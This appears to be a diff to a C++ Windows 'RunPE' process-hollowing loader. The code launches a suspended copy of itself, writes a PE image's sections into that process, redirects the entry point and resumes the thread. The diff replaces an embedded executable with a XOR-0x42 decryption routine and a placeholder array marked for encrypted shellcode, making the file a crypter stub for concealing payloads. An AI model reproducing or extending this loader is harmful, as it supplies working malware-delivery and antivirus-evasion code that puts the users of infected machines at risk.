@@ -55,7 +55,7 @@ int RunPortableExecutable(void* Image)
 
 		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
 			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
-			//process in suspended state, for the new image.
+													 //process in suspended state, for the new image.
 		{
 			// Allocate memory for the context.
 			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
@@ -75,13 +75,13 @@ int RunPortableExecutable(void* Image)
 				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
 				{
 					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
-					
+
 					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
 						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
 				}
 				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
 					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
-				
+
 				// Move address of entry point to the eax register
 				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
@@ -94,14 +94,26 @@ int RunPortableExecutable(void* Image)
 }
 
 // enter valid bytes of a program here.
-//Using 010 Hex editor copy all as C hex works perfectly. A complete hexdump, no magic ;)
-unsigned char rawData[37376] = {
-	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
-	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+//Using 010 Hex editor or HxD - copy all as C hex works perfectly. A complete hexdump, no magic ;)
+void decrypt(unsigned char rawData[], int length)
+{
+	char key = 0x42;
+	for (int i = 0; i < length; i++)
+	{
+		rawData[i] = (char)(rawData[i] ^ key);
+	}
+}
+
+//Place encrypted shellcode here - fix length also!
+const int length = 2;
+unsigned char rawData[length] = {
+	0x00, 0x00
 };
+
 
 int main()
 {
+	decrypt(rawData, length);
 	RunPortableExecutable(rawData); // run executable from the array
 	getchar();
 }
